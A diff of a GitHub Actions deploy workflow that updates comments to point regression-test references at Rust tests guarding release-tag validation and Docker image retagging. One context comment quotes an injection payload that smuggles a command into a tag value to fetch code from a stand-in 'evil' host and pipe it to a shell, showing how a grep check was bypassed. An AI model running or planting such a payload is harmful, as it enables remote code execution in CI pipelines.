@@ -67,7 +67,9 @@ jobs:
             # line-oriented and exits 0 on the first matching line, so
             # $'v1.0.0\n; curl http://evil/x | sh' satisfied `^...$` and the
             # payload rode through. Do not reintroduce a pipeline here.
-            # Regression test: tests/features/deploy-tag-guard.sh
+            # Regression test: xtask/tests/deploy_workflow_guards.rs
+            # (release_tag_guard_rejects_injection_payloads,
+            # harness_detects_line_anchored_grep_as_broken).
             if ! [[ "$RELEASE_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
               echo "refusing to deploy: release tag '$RELEASE_TAG' is not a vX.Y.Z tag" >&2
               exit 1
@@ -142,7 +144,9 @@ jobs:
       # lifecycle rules), not "not built yet" — and rebuilding would push a
       # NEVER-VALIDATED digest to prod under that tag, defeating from the
       # registry end the byte-identity invariant the imagetools retag and
-      # deploy-buildx-guard.sh protect from the build end. Fail loudly instead.
+      # every_imagetools_retag_prefers_the_source_manifest in
+      # xtask/tests/deploy_workflow_guards.rs protects from the build end. Fail
+      # loudly instead.
       #
       # Scoped to workflow_dispatch deliberately. A `release` run legitimately
       # finds no image: nothing builds one for the release commit, because
@@ -196,7 +200,9 @@ jobs:
         # image does not exist locally with the tag". Reintroducing it with
         # `docker buildx build --push` instead is equally wrong — default
         # provenance/SBOM attestations wrap the result in an OCI index.
-        # Regression test: tests/features/deploy-buildx-guard.sh
+        # Regression test: xtask/tests/deploy_workflow_guards.rs
+        # (setup_buildx_action_if_present_is_not_made_the_current_builder,
+        # every_imagetools_retag_prefers_the_source_manifest).
         #
         # So the source here is a single-platform schema2 manifest (plain
         # `docker build` + `docker push` on the bundled docker driver), and
